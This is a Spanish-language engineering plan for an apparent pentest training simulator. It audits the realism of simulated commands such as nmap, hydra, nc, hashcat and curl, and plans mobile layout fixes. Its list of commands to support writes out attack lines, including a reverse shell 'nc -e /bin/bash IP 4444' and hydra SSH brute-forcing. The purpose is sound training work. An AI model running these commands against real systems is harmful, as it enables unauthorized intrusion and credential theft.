# Mejoras Muse — Comandos + Móvil (ZeroInfra Labs)

> **Fecha:** 2026-09-18  
> **Origen:** revisión asistida con Muse Spark (model `muse-spark-1.2-contributor-free`)  
> **Complementa a:** `roadmap_comandos.md` (2026-09-17), `mejoras-deep.md` (2026-09-15), `ROADMAP.md` (fases 0-13 ✅, 14-17 ⏳), `PERMISSIONS.md`, `ARCHITECTURE.md`  
> **Objetivo:** registrar mejoras proyectadas de realismo de comandos y adaptación móvil sin tocar código; base para priorizar con agentes IA.

---

## 0. Resumen ejecutivo

- **Comandos:** 74 nombres en `src/commands/names.ts:10` (62 exports builtin + 12 tools). El simulador es sólido en validación universal (`src/types/mission.ts:28` 17 criteria → `src/utils/labValidator.ts:22`), pero pierde inmersión en flags que un pentester real probará fuera del happy path. Con 10-12 ampliaciones puntuales se llega al 80-85% percibido sin intentar clonar Kali.
- **Móvil:** Landing/Academy/Labs-grid ya son responsive (`SiteHeader.tsx:60`, `LandingPage.tsx:63`, `LabGrid.tsx:100`). El simulador `AppContent.tsx:110` no lo es: `flex + w-72` + `DesktopTerminal` draggable no funciona en 375px. La propuesta es `Academy mobile-first` + simulador en layout vertical progresivo (no 1:1).

---

## 1. Realismo de comandos — audit 2026-09-18

### 1.1 Inventario verificado

- Registro central auto-registrado en `src/commands/index.ts:29` (barrels `builtin` + `tools` + `msfconsole` factory). Fuente de verdad: `COMMANDS` Map + test `src/commands/__tests__/commandNames.test.ts`.
- `src/commands/builtin/index.ts:4` 54 entrypoints (con alias `service`, `netstat`, `env`, `grep/head/tail/wc/sort/uniq`, `mount/umount`, `python/python3`).
- `src/commands/tools/index.ts:4` 12 tools (`nmap`, `hydra`, `gobuster`, `curl`, `ssh`, `ftp`, `nc`, `arp-scan`, `netdiscover`, `msfconsole`, `apt`, `dpkg`; `hashcat` vive en builtin).

### 1.2 Hallazgos por categoría

**Filesystem (75% completo)**
- `ls.ts:28` solo `-l/-a`. Falta `-R/-h/-1/-t` y `ls /ruta/archivo`. Fecha `Jan 01` y `total = items*4` se notan.
- `cat.ts:30` solo 1 archivo, sin `-n`, sin `Is a directory`. Búsqueda `endsWith('/'+path)` colisiona.
- `find.ts:25` útil para SUID (`-perm -4000`) pero sin `-exec`, `-size`, `-mtime`, `-writable`, `2>/dev/null`.
- `ln.ts:52` exige target existente → rompe broken symlink útil en privesc.
- `pipeline.ts:158` `uniq` usa `Set` global (bug: debe ser solo líneas adyacentes). `grep` sin `-n/-c/-o`, `which.ts:12` hardcodeado sin consultar `PackageManager`.

**Network (70%)**
- `ping.ts:55` / `traceroute.ts:68` solo IP regex, sin DNS (`google.com` → `Name or service not known`). Latencia fija, `0% loss` aunque firewall `DROP`.
- `ss.ts:75` `ESTAB` inventa `192.168.1.5:49000` sin distinguir `127.0.0.1` vs `0.0.0.0`.
- `iptables.ts:45` sin `-I/-C/-N/-t nat` (`-I` es crítico). `ufw.ts:22` sin `allow from IP`.
- `nc.ts` + `frameworks/shells/nc/NcSession.ts` parser duplicado; `nc host port` siempre `Connection refused` aunque `effectivePortState()` abierto; falta `nc -e`.
- `netdiscover.ts:42` bug `/16` (`baseIp.slice(0,3)` pierde `10.0.1.x`).

**Processes/System (65%)**
- `ps.ts:40` `START 10:15`, `VSZ` fórmula obvia. `top.ts:30/htop.ts:35` random sin sort.
- `kill.ts:22` sin `killall/pkill`, `systemctl.ts:38` sin `daemon-reload/enable --now`.

**PrivEsc/Identidad (50%)**
- `sudo.ts:22` el más completo (sudoers `ALL`, `NOPASSWD`, `sudo -l` realista, `sudo vim !bash` → `privescCompleted`).
- `hashcat.ts:18` **stub 100%**: solo `hashcat -m 0 hash.txt rockyou.txt` con output `hello` fijo.

**Pentest tools (80% nmap / 40% resto)**
- `nmap/flags.ts:22` ignora `-sU/-sC/--script/-T4/--top-ports`. `-p-` existe pero no `--open` completo. `vendors.ts` solo 4 OUIs.
- `hydra.ts:20` solo `-l -P` con `rockyou.txt` exacto; sin `-L/-p/-t/-V/-f`.
- `gobuster.ts:18` solo `dir -u http://IP -w .../common.txt`; sin `-x/-t/--wildcard`.
- `curl.ts:45` parsea `-H` pero no lo envía a `httpRequest`; `-o` no escribe `filesChanged`.

### 1.3 Top 10 flags que rompen inmersión (probará y fallará)

1. `nmap -sU -sC --script=vuln -T4 -p- --open`
2. `hydra -L users.txt -P rockyou.txt -t 4 -V -f ssh://IP`
3. `gobuster dir -u http://IP -w common.txt -x php,txt -t 50`
4. `find / -perm -4000 2>/dev/null` y `find / -writable -type d`
5. `cat file1 file2` / `cat -n /etc/passwd`
6. `ls -laR /var/www` / `ls -lh`
7. `nc -e /bin/bash IP 4444`
8. `curl -k -H "X-Forwarded-For: 127.0.0.1" -b "PHPSESSID=..."`
9. `hashcat -m 0 hash.txt rockyou.txt --show -o cracked.txt`
10. `grep -r -n "pass" /var/www | head -n 20` (redirección `2>/dev/null` no existe)

### 1.4 Plan 80/20 (más realismo por menos esfuerzo)

> **2026-09-20 — P1 completado** (lotes "Pentest flags" + hashcat/grep/nc).
> Antes de codificar se probó cada item tal cual lo tipearía un usuario:
> varios ya existían y NO se tocaron (`-L`, `-x`/`-t`, `-sU`, `--script`,
> `-T`, `--top-ports`, `--open`, `-oX`, `cat` multi/`-n`, `ls -R`/`-h`,
> `find -perm`/`-writable`, `uniq` adyacente, `which`+PackageManager,
> `ln -s` broken, `2>/dev/null`). Detalle de lo hecho abajo.

**P1 — inmersión crítica (hecho 2026-09-20)**
- [x] `hashcat`: potfile real en `~/.hashcat/hashcat.potfile` (el crack persiste
  vía `filesChanged`); `--show` lee el potfile y filtra por hashfile.
  (`-a`/`-m`/`-o`/lectura de archivo real ya existían.)
- [x] `hydra`: `-t` visible en banner, `-V` imprime `[VERBOSE]` por usuario,
  `-f` anunciado; fix: flags sin valor (`-V`/`-f`) ya no tragan el posicional
  siguiente. (`-L`/`-p`/URI ya existían.)
- [x] `gobuster`: wordlist flexible (cualquiera, no solo `common.txt`);
  `-s`/`-b` (filtro por códigos, default real `200,204,301,302,307,401,403`),
  `-e` (URLs expandidas), `--wildcard` anunciado. (`-x`/`-t` ya existían.)
- [x] `nmap`: `-sU` muestra `puerto/udp open|filtered` (metadata `scanResults`
  intacta en TCP); fix: `-V`/`-f`-style — columna STATE con padding dinámico
  solo en UDP, TCP byte-idéntico.
  (`-sU`/`--script`/`-sC`/`-T`/`--top-ports`/`-oN`/`-oG`/`-oX`/`-oA`/`--open`
  ya existían.)
- [x] `grep`: `-n` (línea, `archivo:N:línea` con `-r`), `-c` (conteo, por
  archivo con `-r`), `-o` (solo match). (`-r`/`-v`/`-i` ya existían.)
- [x] `nc`: parser unificado en `frameworks/shells/nc/ncArgs.ts` (elimina el
  duplicado `tools/nc` ↔ `NcSession`); conexión por estado virtual
  (abierto→`succeeded`, filtrado→timeout, cerrado→refused); `-e` aceptado;
  `-u` conecta a host conocido. Metadata `blockingCommand` intacta.
- [x] `cat` multi-file + `ls -R` + `find -writable` + `2>/dev/null` + `uniq`
  adyacente + `which`→PackageManager: verificados con probe, ya funcionaban.
- [x] Suite: 2139 tests (165 archivos) + `tsc --noEmit` 0.

**P2 — red realista (hecho 2026-09-20)**
- [x] `ping`/`traceroute` resuelven hostname virtual (`PING web (10.0.0.1)`);
  desconocido sigue → `Name or service not known`.
- [x] `iptables -I CHAIN [n] rulespec` (nuevo `insertRule` en `networkState`;
  default posición 1; misma validación que `-A`).
- [x] `ss -s` (resumen Total/TCP/UDP derivado de `getListeningPorts`).
- [x] `curl`: `-H`/`-A`/`-b`/`-u` viajan en `httpRequest.headers` (visibles en
  Burp; `-u` → `Authorization: Basic`); `-k` aceptado y anunciado en `-v`.
- [x] Suite: 2150 tests (165 archivos) + `tsc --noEmit` 0.

**P3 — pulido (hecho 2026-09-20)**
- [x] `ls -l`: fechas determinísticas por path (hora o año, formato real) en
  vez de `Jan 01 00:00`; `total` derivado de tamaños (dirs 4 bloques).
- [x] `sudo -u <user> <cmd>` (corre como otro usuario, `como <user>` en salida;
  privesc y `elevated` solo con run-as root; `-i`/`-s` no-root → mensaje guía).
- [x] `chmod +X`/`-X` condicional (solo dir o ya ejecutable), reevaluado por
  hijo en `-R`. (Octal/simbólico/`-R`/SUID ya existían.)
- [x] MSF desacoplado: el gate "corre el auxiliary primero" depende de
  `auxChecked`, no de `currentMissionId===3` (`msfExploits.ts:64`).
- [x] Suite: 2161 tests (165 archivos) + `tsc --noEmit` 0.

**Transversal:** mensaje unificado `"<flag> no soportado en este simulador. Soportados: ..."` (evita `Usage:` seco) y mantener `<300 líneas` por archivo (`AGENTS.md:79`).

---

## 2. Diseño móvil — audit y propuesta

### 2.1 Estado verificado

- **Bien (no tocar mucho):** `SiteHeader.tsx:60,66,84,106` (`hidden md:flex` ok), `LabGrid.tsx:100` (`grid-cols-1 sm:grid-cols-2 md:grid-cols-3`), `AcademyHome.tsx:109` (`max-w-[880px] px-4 md:px-8`), `LandingPage.tsx:63` hero responsive.
- **1 fix chico:** `SiteHeader.tsx:89` CTA `hidden sm:inline-flex` oculta el CTA en <640px (justo tu tráfico móvil).
- **Roto:** `AppContent.tsx:113` `calc(100vw - 2rem) + margin 1rem + rounded-2xl` desperdicia 32px en móvil; `MissionPanel.tsx:37` `w-72 flex-shrink-0 border-l` deja ~87px al terminal en 375px; `DesktopTerminal.tsx:70` `absolute top-6 left-6` + `WindowFrame` draggable mouse-only sin `touch-action`; `Terminal.tsx:42,115` prompt 2 líneas + `p-5 text-sm` chico para pulgar.

### 2.2 Propuesta: Academy mobile-first + simulador vertical

No replicar desktop en 360px. Branch `md:`:

```
< 768px                          |  ≥768px
WorkspaceTopBar compact          |  layout actual intacto
MobileMissionBar (48px)          |
  networkRange + progress + 2/5  |  MissionPanel w-72
Terminal full-width              |  Terminal + MissionPanel side-by-side
  p-3, 13px, 1 línea prompt      |  p-5
MobileKeyRow sticky (44px)       |  (no keyRow)
  [Tab][|][-][/][Ctrl+C][↑]     |
```

**Cambios concretos:**
- [ ] `AppContent.tsx:113` → `h-[100dvh] w-screen md:h-[calc(100vh-2rem)] md:w-[calc(100vw-2rem)] md:m-4 md:rounded-2xl md:border`.
- [ ] `AppContent.tsx:127` → `flex-col md:flex-row`; `MissionPanel` `hidden md:flex`, drawer móvil `MobileMissionDrawer` con `progress + AttackerCredentials` colapsado.
- [ ] `DesktopTerminal.tsx` → en `<md` bypass: `if(isMobile) return <Terminal ... />` sin ventanas flotantes.
- [ ] `Terminal.tsx` → prop `isMobile`: `p-3 md:p-5`, `text-[13px] md:text-sm`, input `min-h-[44px]`, prompt 1 línea en móvil, fila extra `MobileKeyRow` que inyecta al `inputRef`.
- [ ] `SiteHeader.tsx:89` → `inline-flex` siempre.
- [ ] Banner móvil en simulador: *"Experiencia óptima en desktop. En móvil podés explorar Academy; para labs recomendamos desktop"* + `Continuar igual` (no bloquear).

### 2.3 Fases

- **Fase Móvil 1 (1 día):** fix CTA + wrapper `100dvh` + `MissionPanel` drawer. Ya deja de perder rebote móvil.
- **Fase Móvil 2 (3 días):** `MobileKeyRow` + `Terminal` compact + bypass `DesktopTerminal`.

---

## 3. Roadmap unificado (para agentes IA)

| Orden | Entregable | Archivos clave | Criterio de cierre |
|-------|------------|----------------|--------------------|
| 1 | P1 comandos (hashcat/hydra/gobuster/nmap cat/ls/find uniq/which/nc) | `commands/builtin/*`, `commands/tools/*`, `names.ts`, `help/*`, `utils/permissions.ts` | Tests ES `it('debe ...')` + `fileRead/scanResults/foundCredentials` metadata + `tsc --noEmit` 0 |
| 2 | Móvil Fase 1 | `AppContent.tsx`, `SiteHeader.tsx`, `MissionPanel.tsx` | `pnpm test:run` verde + preview 375px sin scroll horizontal |
| 3 | P2 red | `ping.ts`, `traceroute.ts`, `iptables.ts`, `ss.ts`, `curl.ts` | Flags ignorados con mensaje guía, no `isError` seco |
| 4 | Móvil Fase 2 | `Terminal.tsx`, `DesktopTerminal.tsx` | KeyRow funcional, `DesktopTerminal` no renderiza en móvil |
| 5 | P3 pulido | `sudo.ts`, `chmod.ts`, `frameworks/metasploit/*` | `currentMissionId` desacoplado, `chmod X` diferencial |

Cada lote: `pnpm exec tsc --noEmit` + `pnpm lint` + `pnpm test:run` + `pnpm build`. Mantener `CONTRIBUTING` de `docs/PERMISSIONS.md` y `AGENTS.md:79` helpers de FS.

---

## 4. Tier 1 — lotes A, B, C (2026-09-20, con Muse Spark)

Inventario: 74 → 97 nombres. Cada alta con barrel + `names.ts` +
`help <cmd>` + línea en `help` + path en `which` + tests ES.

**Lote A (80 nombres):** `uname` (kernel por SO, largos `--all`),
`hostname` (muestra, `-I`, cambio con root), `stat` (formato real +
`-c %n%s%a%U%G%F`), `file` (magic/shebang/extensión), `less`/`more`
(dump no interactivo documentado, `-N`, pipe, permisos como cat).

**Lote B (87 nombres):** `alias`/`unalias` (tabla por executor, expansión
en primera palabra de cada segmento preservando quoting, anti-ciclos),
`type` (alias vs comando vía contexto, sin ciclos de import), `history`
(`cmdHistory` por terminal: hooks → request → contexto), `man`
(reutiliza páginas de `help`), `whatis`/`apropos` (índice `WHATIS` de
87 entradas; lo no implementado se marca, no se inventa).

**Lote C (97 nombres):** `cut` (`-d/-f/-c/-s/--complement`), `tr`
(rangos, escapes, `-d/-s/-c`), `tac`, `nl` (`-b/-i/-v/-w/-s`), `rev`,
`column -t` (`-s/-o`), `sed` (`s///[gip]` con `&` y `\1`, `d/p/q`,
direcciones `N/N,M//re/`), `awk` (`/re/`, comparaciones `== ~`,
`BEGIN/END`, `NR/NF/FNR/$NF`, coma vs concatenación), `diff` (normal
`2c2`/`3a4`, `-u` con hunks `@@`, `-q`, LCS con tope), `tee` (`-a`,
permisos vía `writeOutputToFile`).

Resto Tier 1 pendiente: ~~sistema, archivos, red, editor~~ — **completado
el 2026-09-21** (sysinfo.ts + tools/{wget,dns,scp,whois,tcpdump}.ts +
builtin/vi.ts). Inventario final Tier 1: 120 nombres; suite 2295 tests
(182 archivos).

## 5. Seguimiento

- [ ] Revisar `roadmap_comandos.md` tiers tras P1 (re-evaluar si ~240 nombres sigue siendo horizonte).
- [ ] Publicar corpus de tareas (Academy + labs) para medir `tareas compatibles / tareas evaluadas` (ver `roadmap_comandos.md:82`).
- [ ] Archivar este doc en `docs/archive/` cuando P1 + Móvil Fase 1 estén en `main`.

> Nota: este archivo es el único creado el 2026-09-18 por Muse. No se movió ningún doc previo a `archive/` en esta pasada porque `ROADMAP.md` (fases 14-17 ⏳) y `roadmap_comandos.md` (Tier 1-3 pendientes) aún no están completos; `mejoras-deep.md` queda como snapshot hasta cerrar su P0.

